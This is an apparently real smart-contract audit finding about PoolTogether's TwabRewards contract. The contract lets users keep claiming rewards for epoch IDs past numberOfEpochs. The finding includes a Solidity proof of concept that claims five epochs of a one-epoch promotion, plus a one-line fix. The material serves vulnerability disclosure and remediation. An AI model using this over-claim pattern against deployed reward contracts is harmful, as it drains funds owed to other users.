[H-03] Continue claiming reqrds after numberOfEpochs are over
Submitted by gpersoon, also found by 0xabc, csanuragjain, harleythedog, kenzo, and leastwood
Impact
When claiming rewards viaclaimRewards(), the function\_calculateRewardAmount()is called.
The function\_calculateRewardAmount()has a check to make sure the epoch is over
require(block.timestamp>_epochEndTimestamp,"TwabRewards/epoch-not-over");
However neither functions check if the\_epochIdis within the range of the reward epochs.
Ergo it is possible to continue claiming rewards after the reward period is over.
This only works as long as there are enough tokens in the contract. But this is the case when not everyone has claimed, or other rewards use the same token.
The proof of concept contains a simplified version of the contract, and shows how this can be done.
When run in remix you get the following output, while there is only 1 epoch.console.log: Claiming for epoch 1 1 Claiming for epoch 2 1 Claiming for epoch 3 1 Claiming for epoch 4 1 Claiming for epoch 5 1
Proof of Concept
// SPDX-License-Identifier: GPL-3.0pragmasolidity0.8.6;import"hardhat/console.sol";contractTwabRewards{structPromotion{uint216tokensPerEpoch;uint32startTimestamp;uint32epochDuration;uint8numberOfEpochs;}mapping(uint256=>Promotion)internal_promotions;uint256internal_latestPromotionId;mapping(uint256=>mapping(address=>uint256))internal_claimedEpochs;constructor() {uintid=createPromotion(1,uint32(block.timestamp)-10,1,1);claimRewards(id,1);claimRewards(id,2);claimRewards(id,3);claimRewards(id,4);claimRewards(id,5);}functioncreatePromotion(uint216_tokensPerEpoch,uint32_startTimestamp,uint32_epochDuration,uint8_numberOfEpochs)publicreturns(uint256) {uint256_nextPromotionId=_latestPromotionId+1;_latestPromotionId=_nextPromotionId;_promotions[_nextPromotionId] =Promotion(_tokensPerEpoch,_startTimestamp,_epochDuration,_numberOfEpochs);return_nextPromotionId;}functionclaimRewards(uint256_promotionId,uint256_epochId)publicreturns(uint256) {Promotionmemory_promotion=_getPromotion(_promotionId);address_user=address(0);uint256_rewardsAmount;uint256_userClaimedEpochs=_claimedEpochs[_promotionId][_user];for(uint256index=0;index<1;index++) {require(!_isClaimedEpoch(_userClaimedEpochs,_epochId),"TwabRewards/rewards-already-claimed");_rewardsAmount+=_calculateRewardAmount(_promotion,_epochId);_userClaimedEpochs=_updateClaimedEpoch(_userClaimedEpochs,_epochId);}_claimedEpochs[_promotionId][_user] =_userClaimedEpochs;console.log("Claiming for epoch",_epochId,_rewardsAmount);return_rewardsAmount;}functiongetPromotion(uint256_promotionId)publicviewreturns(Promotionmemory) {return_getPromotion(_promotionId);}function_getPromotion(uint256_promotionId)internalviewreturns(Promotionmemory) {return_promotions[_promotionId];}function_isClaimedEpoch(uint256_userClaimedEpochs,uint256_epochId)internalpurereturns(bool){return(_userClaimedEpochs>>_epochId) &uint256(1) ==1;}function_calculateRewardAmount(Promotionmemory_promotion,uint256_epochId)internalviewreturns(uint256) {uint256_epochDuration=_promotion.epochDuration;uint256_epochStartTimestamp=_promotion.startTimestamp+ (_epochDuration*_epochId);uint256_epochEndTimestamp=_epochStartTimestamp+_epochDuration;require(block.timestamp>_epochEndTimestamp,"TwabRewards/epoch-not-over");return1;}function_updateClaimedEpoch(uint256_userClaimedEpochs,uint256_epochId)internalpurereturns(uint256) {return_userClaimedEpochs| (uint256(1) <<_epochId);}function_getCurrentEpochId(Promotionmemory_promotion)internalviewreturns(uint256) {return(block.timestamp-_promotion.startTimestamp) /_promotion.epochDuration;}function_getRemainingRewards(Promotionmemory_promotion)internalviewreturns(uint256) {// _tokensPerEpoch * _numberOfEpochsLeftreturn_promotion.tokensPerEpoch*(_promotion.numberOfEpochs-_getCurrentEpochId(_promotion));}}
Recommended Mitigation Steps
In the function\_calculateRewardAmount()add something like the following in the beginning after the require.if ( \_epochId >= \_promotion.numberOfEpochs) return 0;
PierrickGT (PoolTogether) confirmed